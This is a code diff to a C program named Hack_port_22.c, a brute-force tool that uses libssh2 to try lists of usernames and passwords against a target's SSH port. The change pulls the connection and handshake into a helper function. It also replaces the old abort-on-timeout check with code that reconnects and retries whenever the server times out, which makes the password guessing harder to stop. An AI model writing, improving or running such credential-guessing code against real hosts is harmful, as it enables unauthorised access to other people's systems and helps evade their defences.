@@ -2,7 +2,7 @@
  ============================================================================
  Name        : Hack_port_22.c
  Author      : L.
- Version     : 1.0.4
+ Version     : 1.0.5
  Copyright   : GNU General Public License v3.0
  Description : Hack Port 22
  ============================================================================
@@ -14,36 +14,13 @@
 
 int hack_port_22(in_addr_t ip, int port){
 	//BFA
-	printf("%s", DEFAULT);
-	char *userauthlist;
-	int auth_pw = 0, rc,timeouts=0;
-	LIBSSH2_SESSION *session;
 	printf("%s",HBLUE);
 	printf("\nTrying to perform connections by using brute force...\n\n");
 	printf("%s",BLUE);
-	rc = libssh2_init(0);
-	if(rc != 0) {
-		printf("libssh2 initialization failed (%d)\n", rc);
-		return 1;
-	}
-	int sk=socket(AF_INET,SOCK_STREAM, 0);
-	if(sk<0){
-		printf ("Error creating socket. Error number : %d . Error message : %s \n" , errno , strerror(errno));
-		exit(EXIT_FAILURE);
-	}
-	struct sockaddr_in serverAddress;
-	serverAddress.sin_family = AF_INET;
-	serverAddress.sin_port=htons(port);
-	serverAddress.sin_addr.s_addr= ip;
-	if(connect(sk, (struct sockaddr *) &serverAddress, sizeof(serverAddress))<0){
-		printf("Send message connection error. Error message: %s (%d)\n", strerror(errno),errno);
-		return -1;
-	}
-	session = libssh2_session_init();
-	if(libssh2_session_handshake(session, sk)) {
-		printf("Failure establishing SSH session: %s (%d)\n", strerror(errno),errno);
-		return -1;
-	}
+	char *userauthlist;
+	int auth_pw = 0, timeouts=0;
+	LIBSSH2_SESSION *session=NULL;
+	int sk=create_SSH_handshake_session(&session, ip, port);
 	const char *fingerprint;
 	fingerprint = libssh2_hostkey_hash(session, LIBSSH2_HOSTKEY_HASH_SHA1);
 	printf("Fingerprint: ");
@@ -72,8 +49,18 @@ int hack_port_22(in_addr_t ip, int port){
 	i=0;
 	while(fscanf(f,"%s", passwords[i])!=EOF) i++;
 	totalComb=totalUsernames*totalPasswords;
-	for(i=0;i<totalUsernames && timeouts<BRUTE_FORCE_TIMEOUT;i++){
-		for(int j=0;j<totalPasswords && timeouts<BRUTE_FORCE_TIMEOUT;j++,cont++){
+	for(i=0;i<totalUsernames;i++){
+		for(int j=0;j<totalPasswords;j++,cont++){
+			if(timeouts==1){
+				libssh2_session_disconnect(session, "");
+				sk=create_SSH_handshake_session(&session, ip, port);
+				if(sk<0){
+					show_error("Error creating handshake");
+					goto exit;
+				}
+				timeouts=0;
+				j--;
+			}
 			printf("\rPercentaje completed: %.4lf%% (%s/%s)                   ",(double)((cont/totalComb)*100.0),usernames[i], passwords[j]);
 			fflush(stdout);
 			usleep(BRUTE_FORCE_DELAY);
@@ -109,11 +96,38 @@ int hack_port_22(in_addr_t ip, int port){
 			}
 		}
 	}
-	if(timeouts==3) printf("\n\nBrute Force hacking aborted by timeouting");
+	exit:
 	libssh2_session_disconnect(session, "");
 	libssh2_session_free(session);
 	printf("%s", DEFAULT);
 	printf("\n");
 	close(sk);
 	return 0;
+}
+
+int create_SSH_handshake_session(LIBSSH2_SESSION **session, in_addr_t ip, int port){
+	int rc = libssh2_init(0);
+	if(rc != 0) {
+		printf("libssh2 initialization failed (%d)\n", rc);
+		return 1;
+	}
+	int sk=socket(AF_INET,SOCK_STREAM, 0);
+	if(sk<0){
+		printf ("Error creating socket. Error number : %d . Error message : %s \n" , errno , strerror(errno));
+		exit(EXIT_FAILURE);
+	}
+	struct sockaddr_in serverAddress;
+	serverAddress.sin_family = AF_INET;
+	serverAddress.sin_port=htons(port);
+	serverAddress.sin_addr.s_addr= ip;
+	if(connect(sk, (struct sockaddr *) &serverAddress, sizeof(serverAddress))<0){
+		printf("Send message connection error. Error message: %s (%d)\n", strerror(errno),errno);
+		return -1;
+	}
+	*session = libssh2_session_init();
+	if(libssh2_session_handshake(*session, sk)) {
+		printf("Failure establishing SSH session: %s (%d)\n", strerror(errno),errno);
+		return -1;
+	}
+	return sk;
 }
